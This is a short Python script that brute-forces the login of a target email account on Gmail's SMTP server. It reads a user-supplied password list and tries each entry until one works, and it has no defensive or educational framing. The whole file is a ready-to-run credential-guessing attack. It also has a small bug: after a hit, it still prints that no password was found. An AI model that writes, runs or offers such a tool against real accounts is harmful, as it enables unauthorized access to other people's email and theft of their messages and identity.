#!/usr/bin/env python3
"""
brute_force_smtp.py - Brute force an smtp server.
"""

import smtplib
from termcolor import colored
from pyfiglet import Figlet

figlet = Figlet(font='standard')
print(figlet.renderText('SMTP brute forcer'))

# SMTP settings
smtp_server = "smtp.gmail.com"
smtp_port = 587

# Start the SMTP
smtp = smtplib.SMTP(smtp_server, smtp_port)
smtp.ehlo()
smtp.starttls() 

# Request the username and password file path
username = input("[*] Enter target email address: ")
password_file_path = input("[*] Enter password file path: ")



try:
    # Open the file containing the list of passwords, one per line.
    with open(password_file_path, 'r') as password_file:
        for password in password_file:
            password = password.strip('\n')
            try:
                smtp.login(username, password)
                print(colored("[+] Password found: " + password, "green"))
                break
            except smtplib.SMTPAuthenticationError:
                print(colored("[-] Password not correct: " + password, "red"))
                continue
            except smtplib.SMTPException:
                print(colored("[-] Password not correct: " + password, "red"))
                continue
            except KeyboardInterrupt:
                print(colored("[-] User Interrupt", "red"))
                break
            except Exception as e:
                print(colored("[-] Error: " + str(e), "red"))
                continue
        print(colored("[-] Sorry, Password not found in file", "red"))
        
# If the file is not found, print an error message.
except FileNotFoundError:
    print(colored("[-] File not found", "red"))

smtp.quit()
exit()